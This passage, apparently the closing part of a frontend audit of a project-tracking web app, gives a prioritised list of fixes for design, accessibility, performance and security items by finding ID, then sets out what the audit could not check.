7. Component primitives + semantic tokens (D-01, D-02) — this unlocks consistent look, dark mode, branding and most accessibility fixes at once.
8. Keyboard-operable menus, label association, modal dirty-guard (U-03, U-04, U-05).
9. Decide and state the mobile and i18n position (U-01, U-02); either build them or remove the half-features (locale list, mobile menu).
10. S-06, S-07, R-07, R-12, B-14.
11. Replace emoji avatars (D-03).

**For top-tier polish (P2/P3):**
12. Route-level code splitting, list virtualisation, query defaults (section 6).
13. Motion, empty states, icon set, type scale (D-04 – D-08).
14. Profile completeness, 2FA QR, personal tokens (U-08, S-09).
15. First-run onboarding and brand identity (U-07, D-09).

---

## 10. What this audit cannot tell you

- Whether any `Verify` item is actually exploitable — that needs the backend code or a running instance.
- Real rendering, contrast, overflow and performance numbers — nothing was executed. Run Lighthouse and axe against a seeded instance, and click through each flow at 1280px, 1024px and 390px.
- Issues in the files listed as partially read. Backlog, issue navigator, reports, timeline, dashboards, workflow editor and most admin pages deserve the same line-by-line pass.
